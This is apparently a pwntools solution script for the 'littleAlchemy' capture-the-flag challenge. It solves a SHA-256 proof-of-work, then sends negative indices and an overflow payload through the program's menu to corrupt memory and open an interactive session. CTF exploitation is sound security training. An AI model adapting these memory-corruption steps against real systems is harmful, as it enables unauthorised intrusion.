#!/usr/bin/env python3

from pwngun_craft import craft
from pwn import *
from hashlib import sha256

# SETTINGS

BINARY = "./littleAlchemy"

IP = "challs.m0lecon.it"
PORT = 2123

LINK_LIBC = False
LIBC = ""
LD = ""
GDBSCRIPT = """
"""

LOG_LEVEL = "DEBUG"

r, elf, libc = craft(LINK_LIBC, BINARY, LIBC, LD, GDBSCRIPT, IP, PORT, LOG_LEVEL)



r.recvuntil("Give me a string starting with ")
pref = r.recvuntil(' ')[:-1].decode()
r.recvuntil("sha256sum ends in ")
end = r.recvline()[:-2].decode()

i = 0

while True:
    s = pref + str(i)
    if sha256(s.encode()).hexdigest().endswith(end):
        break
    i += 1

r.sendline(s)



# SPLOIT #
r.recvuntil('>')
r.sendline('1')
r.recvuntil(': ')
r.sendline('1')
r.recvuntil(': ')
r.sendline('-1')
r.recvuntil(': ')
r.sendline('-1')

r.recvuntil('>')
r.sendline('1')
r.recvuntil(': ')
r.sendline('2')
r.recvuntil(': ')
r.sendline('-1')
r.recvuntil(': ')
r.sendline('-2')

r.recvuntil('>')
r.sendline('1')
r.recvuntil(': ')
r.sendline('3')
r.recvuntil(': ')
r.sendline('-1')
r.recvuntil(': ')
r.sendline('-3')

r.recvuntil('>')
r.sendline('4')
r.recvuntil(': ')
r.sendline('3')
r.recvuntil(': ')
r.sendline('A' * 24 + chr(0x60 - 8))

r.recvuntil('>')
r.sendline('6')
r.recvuntil(': ')
r.sendline('3')
r.recvuntil(': ')
r.sendline('1')

r.recvuntil('>')
r.sendline('5')
r.recvuntil(': ')
r.sendline('2')

r.interactive()
